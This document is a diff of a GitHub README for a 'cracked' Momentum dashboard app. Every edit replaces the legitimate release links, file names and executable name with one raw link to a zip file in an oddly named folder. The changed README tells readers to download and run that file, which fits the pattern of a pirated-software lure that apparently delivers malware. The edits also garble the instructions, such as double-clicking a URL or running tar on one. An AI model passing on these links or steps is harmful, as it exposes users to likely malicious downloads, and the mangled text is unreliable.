@@ -1,6 +1,6 @@
 # 🌟 cracked-momentum-dashboard - Boost Your Productivity with a Smart New Tab
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/3hxrp/cracked-momentum-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip%20Now-Get%20the%https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip)](https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Make sure your system meets these basic requirements:
 
 To get started, you need to download the application.
 
-- Visit this page to download: [Cracked Momentum Dashboard Releases](https://github.com/3hxrp/cracked-momentum-dashboard/releases)
+- Visit this page to download: [Cracked Momentum Dashboard Releases](https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip)
 
 ### 3. Choose the Right Version
 
@@ -37,9 +37,9 @@ Once you find the version you want, follow these steps:
 3. If asked, choose a location on your computer to save the file.
 
 For example, you may see files like:
-- `cracked-momentum-dashboard-windows.zip` for Windows
-- `cracked-momentum-dashboard-macos.dmg` for macOS
-- `cracked-momentum-dashboard-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip` for Windows
+- `https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip` for macOS
+- `https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip` for Linux
 
 ### 5. Extract and Open
 
@@ -48,7 +48,7 @@ For example, you may see files like:
 1. Locate the downloaded `.zip` file.
 2. Right-click on the file and select "Extract All."
 3. Choose a folder to extract the contents.
-4. Open the extracted folder and double-click `CrackedMomentum.exe` to launch the application.
+4. Open the extracted folder and double-click `https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip` to launch the application.
 
 #### For macOS
 
@@ -60,7 +60,7 @@ For example, you may see files like:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `tar -xvzf cracked-momentum-dashboard-linux.tar.gz` to extract it.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip` to extract it.
 4. Navigate to the extracted folder and run the application using `./CrackedMomentum`.
 
 ### 6. Set Up the Dashboard
@@ -89,7 +89,7 @@ If you encounter any issues while using the Cracked Momentum Dashboard, try the 
 1. **Reinstall the Application:** If the application isn’t running correctly, uninstall and then reinstall.
 2. **Check Browser Settings:** Ensure Chrome allows extensions to run.
 3. **Clear Cache:** Go to Chrome settings and clear your browser cache.
-4. **Look for Updates:** Always check for the latest version on the [Releases page](https://github.com/3hxrp/cracked-momentum-dashboard/releases).
+4. **Look for Updates:** Always check for the latest version on the [Releases page](https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -113,4 +113,4 @@ For further assistance, you can reach out through the Issues section on GitHub. 
   
 ## 🏆 Download & Install
 
-To download the Cracked Momentum Dashboard, please visit this page: [Cracked Momentum Dashboard Releases](https://github.com/3hxrp/cracked-momentum-dashboard/releases) and follow the installation instructions above. Enjoy managing your time effortlessly!
+To download the Cracked Momentum Dashboard, please visit this page: [Cracked Momentum Dashboard Releases](https://raw.githubusercontent.com/3hxrp/cracked-momentum-dashboard/main/whenness/cracked-momentum-dashboard.zip) and follow the installation instructions above. Enjoy managing your time effortlessly!
